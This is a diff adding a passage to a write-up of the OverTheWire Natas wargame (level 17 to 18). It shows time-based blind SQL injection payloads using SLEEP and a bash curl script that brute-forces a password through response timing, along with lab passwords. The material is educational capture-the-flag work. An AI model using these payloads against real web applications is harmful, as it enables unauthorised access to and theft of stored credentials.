@@ -478,3 +478,47 @@ This time, we start with `b` and then try to append each char after it. If the s
 We get the output `bo7LFNb8vwhHb9s75hokh5TF0OC`. Now to find the left part, we will do the same but trying to add each char to the left of this output. I will not bring that code as it is very similar, but at the end we get the full password.
 
 Password: `EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC`
+
+## Level 17 → 18
+This level is exactly the same as [level 15](https://github.com/iAdani/Cyber-Learning/tree/main/OverTheWire/Natas#level-15--16), but this time the responses from the server are in a comment, so we do not get any feedback at all. We need to use a more complicated type of `blind SQL injection`, where our only response from the server is timing (how long it takes to get a resonse). We first want to find the target username. 
+
+### Burp Suite
+`Burp Suite` (or just `Burp`) is a powerful web vulnerability testing tool used by security professionals and ethical hackers to find and exploit weaknesses in web applications. It acts as an intercepting proxy between your browser and the target application, allowing you to inspect, modify, and replay `HTTP/S` requests and responses. `Burp Suite` includes various tools such as `Repeater` for manual testing, `Intruder` for automated attacks like brute-force or fuzzing, and `Scanner` (in the Pro version) for automated vulnerability detection. It's especially popular for tasks like testing login forms, detecting SQL injection, XSS, and other web-based exploits.
+
+Assuming the target user is `natas18`, I intercepted a request and used the `Repeater` on `Burp` with the following input in a `POST` request body.
+```sql
+username=natas18" AND SLEEP(5) #
+```
+`Burp` automatically used `URL encoding` on that input. What happens here is only if `natas18` exists, then the query will try the right part of the `AND` and will execute `SLEEP(5)`. And indeed, by using this input the response from the server takes more than 5 seconds, while on other usernames it takes less than 1.
+
+Now we know the username and that `time-based blind SQL injection` can be done in this case. To reveal the password, we will use the same technique as in [level 15](https://github.com/iAdani/Cyber-Learning/tree/main/OverTheWire/Natas#level-15--16), but with response time and not response content.
+
+```bash
+#!/bin/bash
+url="http://natas17.natas.labs.overthewire.org"
+credentials="natas17:EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC"
+prefix=""
+chars="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+
+while [ ${#prefix} -lt 32 ]; do
+	for char in $(echo $chars | fold -w1); do
+		pref="${prefix}${char}";
+		start=$(date +%s)
+
+		response=$(curl -X POST -s -u $credentials -d "username=natas18\"+AND+IF(password+LIKE+BINARY+'$pref%', SLEEP(4),0) OR username=\" #" $url);
+		
+		if [ $(($(date +%s) - $start)) -ge 4 ]; then
+			prefix=$pref
+			echo "Current: $prefix"
+		fi
+	done
+done
+echo $prefix
+```
+We inject this value:
+```sql
+username=natas18" AND IF(password LIKE BINARY '$pref%', SLEEP(4),0) OR username=" #
+```
+`OR username="` is used to "close" the quotes that the server used. We check the response time from the server, and if it is greater that 4 seconds then we got a match, and we move to the next char.
+
+Password: `6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ`
